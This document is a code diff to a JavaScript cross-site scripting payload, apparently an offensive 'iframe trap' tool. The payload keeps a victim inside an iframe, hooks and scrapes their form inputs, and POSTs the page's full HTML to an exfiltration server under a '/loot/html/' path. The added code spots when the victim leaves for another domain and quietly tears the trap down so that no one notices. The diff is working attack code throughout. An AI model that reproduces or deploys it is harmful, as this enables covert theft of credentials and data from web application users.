@@ -29,8 +29,8 @@ let startingPage = "https://targetapp.possiblymalware.com/wp-admin";
 // Exfil server
 let exfilServer = "http://localhost:8444";
 
-// Should we exfil the entire DOM?
-let exfilDOM = true;
+// Should we exfil the entire HTML code?
+let exfilHTML = true;
 
 
 
@@ -139,6 +139,16 @@ const MurderCritter = [
 
 
 // *******************************************************************************
+
+function canAccessIframe(iframe) {
+  try {
+    return Boolean(iframe.contentDocument);
+  }
+  catch(e){
+    return false;
+  }
+}
+
 
 // Generate a session identifier
 function initSession()
@@ -390,21 +400,18 @@ function checkSessionStorage()
 
 
 
-// Optional, copy the entire dang dom, zip it, and send out
-function sendDOM()
+// Optional, copy the entire HTML and send out
+function sendHTML()
 {
 	trapURL = document.getElementById("iframe_a").contentDocument.location.href;
-	trapDom = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;
-
-	// console.log("TRAP DOM:");
-	// console.log(trapDom)
+	trapHTML = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;
 
 	request = new XMLHttpRequest();
-	request.open("POST", exfilServer + "/loot/dom/" + sessionName);
+	request.open("POST", exfilServer + "/loot/html/" + sessionName);
 	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 	var jsonObj = new Object();
 	jsonObj["url"] = trapURL;
-	jsonObj["dom"] = trapDom;
+	jsonObj["html"] = trapHTML;
 	var jsonString = JSON.stringify(jsonObj);
 	request.send(jsonString);
 }
@@ -419,6 +426,29 @@ function sendDOM()
 // iframe trap, not the one with the XSS vuln. 
 function runUpdate()
 {
+	// iFrame trap disable code
+	if (!canAccessIframe(document.getElementById("iframe_a")))
+	{
+		// If we can't access the iframe anymore, that 
+		// means the iframe has changed origin. They 
+		// surfed away to a new domain, probably through a link
+		// 
+		// This is bad, the new page won't load in the iframe trap
+		// and will throw very obvious errors on their page
+		// indicating something isn't right  
+		//
+		// Safest thing is the kill the iframe trap and hope
+		// no one notices. We'll reload the parent page to the current 
+		// iframe page. It'll seem like clicking the link to the 
+		// external page didn't work, but the second click will. 
+		// First click exits the iframe, reloads the normally. 
+		// Second click will properly load the external page. 
+		// Sad to lose the trap through. 
+		window.location = lastFakeUrl;
+	}
+
+
+
 	var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
 	var fullUrl = document.getElementById("iframe_a").contentDocument.location.href;
 	// console.log("$$$ Location: " + document.getElementById("iframe_a").contentDocument.location);
@@ -449,10 +479,10 @@ function runUpdate()
 		// Handle input scraping
 		hookInputs();
 
-		// Exfil DOM
-		if (exfilDOM)
+		// Exfil HTML code
+		if (exfilHTML)
 		{
-			sendDOM();
+			sendHTML();
 		}
 	}
 
